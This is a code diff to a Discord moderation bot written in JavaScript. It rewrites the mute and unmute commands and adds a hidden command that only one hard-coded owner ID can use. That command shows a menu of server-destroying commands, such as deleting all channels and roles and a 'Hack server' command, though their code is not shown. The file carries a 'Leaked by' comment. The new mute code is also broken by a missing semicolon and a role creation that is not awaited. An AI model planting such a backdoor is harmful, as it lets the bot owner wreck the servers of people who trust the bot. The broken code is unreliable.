@@ -398,58 +398,65 @@ var prefix = "-";
        
 });
 
-client.on('message', async message =>{
-  if (message.author.boss) return;
-	var prefix = "-";
-
+client.on('message',  message =>{ // Leaked by [ @M3a4x ]
+var moruad = 60000;
+if (message.author.omar) return;
 if (!message.content.startsWith(prefix)) return;
-	let command = message.content.split(" ")[0];
-	 command = command.slice(prefix.length);
-	let args = message.content.split(" ").slice(1);
-	if (command == "mute") {
-		if (!message.channel.guild) return;
-		if(!message.guild.member(message.author).hasPermission("MANAGE_MESSAGES")) return message.reply(":x: You Dont Have Perms `MANAGE_MESSAGES`").then(msg => msg.delete(5000));
-		if(!message.guild.member(client.user).hasPermission("MANAGE_MESSAGES")) return message.reply("The Bot Haven't Perms `MANAGE_MESSAGES`").then(msg => msg.delete(5000));;
-		let user = message.mentions.users.first();
-		let muteRole = message.guild.roles.find("name", "Muted");
-		if (!muteRole) return message.reply("**You Should Create A Rank Name `Muted`**").then(msg => {msg.delete(5000)});
-		if (message.mentions.users.size < 1) return message.reply('**You Have To Mention SomeOne**').then(msg => {msg.delete(5000)});
-		let reason = message.content.split(" ").slice(2).join(" ");
-		message.guild.member(user).addRole(muteRole);
-		const muteembed = new Discord.RichEmbed()
-		.setColor("RANDOM")
-		.setAuthor(`Muted!`, user.displayAvatarURL)
-		.setThumbnail(user.displayAvatarURL)
-		.addField("**:busts_in_silhouette:  User**",  '**[ ' + `${user.tag}` + ' ]**',true)
-		.addField("**:hammer:  By**", '**[ ' + `${message.author.tag}` + ' ]**',true)
-		.addField("**:book:  Reason**", '**[ ' + `${reason}` + ' ]**',true)
-		.addField("User", user, true)
-		message.channel.send({embed : muteembed});
-		var muteembeddm = new Discord.RichEmbed()
-		.setAuthor(`Muted!`, user.displayAvatarURL)
-		.setDescription(`      
-${user} You Are Muted Because You Broke Rules 
-${message.author.tag} By
-[ ${reason} ] : Reason
-If You Didnt Any Thing GGO To Staff
-`)
-		.setFooter(`Server : ${message.guild.name}`)
-		.setColor("RANDOM")
-	user.send( muteembeddm);
+if(!message.channel.guild) return message.channel.send('**هذا الأمر فقط للسيرفرات**').then(m => m.delete(5000));
+if(!message.guild.member(client.user).hasPermission("MANAGE_ROLES")) return message.reply("**I Don't Have `MANAGE_ROLES` Permission**").then(msg => msg.delete(6000))
+var command = message.content.split(" ")[0];
+command = command.slice(prefix.length);
+var args = message.content.split(" ").slice(1);
+    if(command == "mute") {
+   var tomute = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
+    if(!tomute) return message.reply("**يجب عليك المنشن اولاّ**:x: ") .then(m => m.delete(5000));
+	if(tomute.hasPermission("MANAGE_MESSAGES"))return      message.channel.send('**للأسف لا أمتلك صلاحية** `MANAGE_MASSAGEES`');
+    var muterole = message.guild.roles.find(`name`, "Muted");
+    //start of create role
+    if(!muterole){
+      try{
+        muterole =  message.guild.createRole({
+          name: "Muted",
+          color: "#070000",
+          permissions:[]
+        })
+        message.guild.channels.forEach((channel, id) => {
+          channel.overwritePermissions(muterole, {
+            SEND_MESSAGES: false,
+            ADD_REACTIONS: false
+          });
+        });
+      }catch(e){
+        console.log(e.stack);
+      }
+    }
+    //end of create role
+  var mutetime = args[1];
+    if(!mutetime) return message.reply("**يرجى تحديد وقت الميوت**:x:");
+if(isNaN(mutetime)) return message.reply("** يرجي تحديد الوقت بـ الارقام فقط الارقام بلدقائق")
+   (tomute.addRole(muterole.id));
+message.reply(`<@${tomute.id}> **تم اعطائه ميوت ومدة الميوت** : ${mutetime}m`);
+setTimeout(function(){
+      tomute.removeRole(muterole.id);
+      message.channel.send(`<@${tomute.id}> **انقضى الوقت وتم فك الميوت عن الشخص**:white_check_mark: `);
+    }, mutetime*moruad);
+
+
+
   }
 if(command === `unmute`) {
-  if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.channel.sendMessage(":x: You Dont Have Perms `MANAGE_MESSAGES`").then(m => m.delete(5000));
-if(!message.guild.member(client.user).hasPermission("MANAGE_MESSAGES")) return message.reply("The Bot Haven't Perms `MANAGE_MESSAGES`").then(msg => msg.delete(6000))
+  if(!message.member.hasPermission("MANAGE_ROLES")) return message.channel.sendMessage("**ليس لديك صلاحية لفك عن الشخص ميوت**:x: ").then(m => m.delete(5000));
+if(!message.guild.member(client.user).hasPermission("MANAGE_ROLES")) return message.reply("**I Don't Have `MANAGE_ROLES` Permission**").then(msg => msg.delete(6000))
 
-  let toMute = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0]);
-  if(!toMute) return message.channel.sendMessage(":x: You Have To Mention SomeOne ");
+ var toMute = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0]);
+  if(!toMute) return message.channel.sendMessage("**عليك المنشن أولاّ**:x: ");
 
-  let role = message.guild.roles.find (r => r.name === "Muted");
-  
-  if(!role || !toMute.roles.has(role.id)) return message.channel.sendMessage(":x: This User In Not Muted")
+  var role = message.guild.roles.find (r => r.name === "Muted");
 
-  await toMute.removeRole(role)
-  message.channel.sendMessage(":white_check_mark: Succes Has Been Unmuted The User");
+  if(!role || !toMute.roles.has(role.id)) return message.channel.sendMessage("**لم يتم اعطاء هذه شخص ميوت من الأساس**:x:")
+
+  toMute.removeRole(role)
+  message.channel.sendMessage("**لقد تم فك الميوت عن شخص بنجاح**:white_check_mark:");
 
   return;
 
@@ -1010,6 +1017,41 @@ if (message.content.startsWith("-close")) {
  
 
 });
+
+////////////////////////////////////////////////////OWNER////////////////////////////////////////////////
+client.on('message', message => {
+              var prefix = "-" ;
+  if (message.content.startsWith(prefix + "gekyume")) {
+  if(message.author.id !== "351366504068939777") return message.reply('**You aren\'t the bot owner.**');
+  let embed = new Discord.RichEmbed()
+      .setColor("RANDOM")
+      .setDescription(`
+😈__⚠🚫⚠_ 🖤😎 - ＧＥＫＹＵＭＥ - 😎🖤  _⚠🚫⚠__😈
+
+🖤(-dc ⟿⟿⟿ Delete all channels)🖤
+
+🖤(-dr ⟿⟿⟿⟿ Delete all roles)🖤
+
+🖤(-serooms ⟿⟿⟿ Create Rooms)🖤
+
+🖤(-seroles ⟿⟿⟿⟿ Create Roles)🖤
+
+🖤(-inv ⟿⟿⟿⟿ Invite bot owner)🖤
+
+⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠
+🖤(!gekohack ⟿⟿⟿⟿⟿ Hack server)🖤
+⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠⚠
+
+
+😈__⚠🚫⚠_ 🖤😎 - ＧＥＫＹＵＭＥ - 😎🖤  _⚠🚫⚠__😈
+
+ `)
+   message.channel.sendEmbed(embed)
+   
+	  
+	  
+   }
+   });
 
 
 
